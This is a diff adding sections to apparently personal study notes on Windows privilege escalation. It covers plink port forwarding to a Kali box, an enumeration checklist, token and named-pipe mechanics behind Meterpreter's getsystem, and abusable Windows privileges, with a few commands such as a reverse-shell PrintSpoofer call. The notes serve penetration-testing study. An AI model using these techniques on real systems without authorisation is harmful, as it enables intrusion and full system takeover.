@@ -360,3 +360,124 @@ Note: -r is kali ip address as its redirector and to listen on port 9999. This i
 4. You will need to transfer and run vc_redist.x64.exe 
 5. Once you get a shell with a service account with the above privileges. You will run PrintSpoofer from this service shell:
 `.\PrintSpoofer.exe -i -c C:\path\to\revereshell.exe`
+
+## Port Forwarding
+
+* Sometimes it is easier to ru nexploit code on Kali, but the vulnerable program is listening on an internal port.
+* In this case we need to forward a port on Kali to the internal port on windows
+* We can do this using a program called plink.exe (from the makers of putty)
+1. If the firewall is blocking port 445 which the winexe command uses to connect we may need to use port forwarding
+2. We must permit root login to ssh on our kali box (if we are using a root user on kali). We can do this by making sure that the /etc/ssh/sshd_config file has the `PermitRootLogin yes` uncommented.
+3. If it isn't uncommented you will have to restart ssh `service ssh restart`
+4. Next we run plink.exe `.\plink.exe root@192.168.X.X -R 445:127.0.0.1:445`
+Note: root@192.168.x.x is the user and ip of the kali box, 445 is the port to forward on kali, while 127.0.0.1:445 is the local ip of the windows box and the port to forward locally.
+5. Now we can modify the winexe on our kali box to point to local host `winexe -U admin%password123 //127.0.0.1 cmd.exe`
+
+## Privilege Escalation Strategy
+* Enumeration is key
+1. Check your user (whoami and whoami /priv) and groups (net user <username>)
+2. Run winPEAS with fast, searchfast and cmd options
+* If your initial scans don't find anything you can run it without these commands
+4. Run seatbelt and other scripts as well!
+5. If your scripts are failing and you don't know why you can always run the commands manually from the course and other Winodws PrivEsc cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+* Spend some time and read over the results of you enumeration
+* If winPEAS or another tool finds something interesting make note of it
+* Avoid rabbits holes by creating a checklist of things you need for the privilege escalation method to work
+
+* Have a quick look around for files in your users desktop and other common locations (e.g C:\ and C:\Program Filess)
+* Read through interesting files that you find , as they may contain useful information that could help escalate privileges.
+* Try things that don't have many steps first (e.g registry exploits, services, etc)
+
+* Have a good look at admin processes, enumerate their versions and search for exploits
+* Check for internal ports that you might be able to forward to your attacking machine
+
+* If you still don't have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd
+* THis might be a process or file name you aren't familiar with or even a username.
+* At this stage you may also start to consider Kernel Exploits
+
+## getsystem (Named Piupes and Token Duplication)
+
+### Access Tokens
+
+* Access Tokens are special objects in Windows which store a user's identity and privileges.
+* Primary Access Token - Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access toekn is copied and attached to the new process.
+* Impersonation Access Token - Created when a process or thread needs to temporarily run with the security context of another user.
+
+### Token Duplication
+
+* Windows allows processes/threads to duplicate their access tokens.
+* An impersonation access token can be duplicated into a primary access token this way.
+* If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.
+
+### Named Pipes
+* May already be familiar with the concept of a *pipe* in Windows & Linux: `systeminfo | findstr Windows
+* A named pipe is an extension of this concept
+* A prcoess can create a named pipe, and other processes can open the named pipe to read or write data from/to it
+* The process whcih created the named pipe can impersonate the security context of a process whcih connects to the named pipe
+
+### getsystem
+* The *getsystem* command in Metasploits Meterpreter can excalate our privilegs to that of the SYSTEM user
+* The source code for the getsystem can found [here](https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter/source/extensions/priv)
+* Three files worth looking at at: elevate.c, namedpipe.c, and tokendup.c
+* These are 3 techniques getsystem can use to *get system*
+
+#### Named Pipe Impersonation (In Memory/Admin)
+* Creates a named pipe controlled by Meterpreter
+* Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe
+* Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context)
+* The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges
+
+#### Named Pipe Impersonation (Dropper/Admin)
+* Very similar to Named Pipe Impersonation (In Memory/ADmin_
+* Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM
+* The DLL connects to the named pipe
+
+#### Token Duplication (In Memory/Admin)
+* This technique requires the *SeDebugPrivilege*
+* Find a service running as SYSTEM which it injects a DLL into
+* The DLL duplicates the access toekn of the service and assigns it to Meterpreter
+* Currently this only works on x86 architectures
+* This is the onl technique that does not have to create a service, and operates entirely in memory.
+
+## User Privileges
+* In Windows, user accounts and groups can be assigned specific *privileges*
+* These privileges grant access to certain abilities
+* Some of these abilities can be used to escalate your overall privielges to the of SYSTEM.
+* Highly detailed paper: https://github.com/hatRiot/token-priv
+
+### Listing our Privileges
+`whoami /priv`
+Note:: *disabled* in the state column is irrelevant here. If the privilege is listed your user has it.
+
+### SeImpersonate Privilege
+* Grant ability to impersonate any access token which it can obtain
+* If an access token from a SYSTEM process can be obtained than a new process can be spawned using that token.
+* The JuicyPotato exploit in a previous section abuses this ability
+
+### SeAssignPrimaryPrivilege
+* The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege
+* It enables a user to asisng an access token to a new process
+* Again, this can be exploited with the JuicyPotato Exploit
+
+### SeBackUpPrivilege
+* Grants read access to all objects on the system, regardless of their ACL
+* Useing this privilege a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used ina pass-the-hask attack
+
+### SeRestorePrivilege
+* Grants write acces to all objects on the system, regardless of their ACL
+* Many ways to abuse this:
+  * Modify service binaries.
+  * Overwrite DLLs userd by the SYSTEM processes
+  * Modify registry settings
+
+### SeTakeOwnershipPrivilege
+* Lets user take ownership over an object (the WRITE_OWNER permission)
+* Once you own an object, you can modify its ACL and grant yourself write access
+* Same methods used with SeRestorePrivilege then Apply
+
+### Other Privileges (More advanced)
+* SeTcbPrivilege
+* SeCreateTokenPrivilege
+* SeLoadDriverPrivilege
+* SeDebugPrivilege (used by get system)
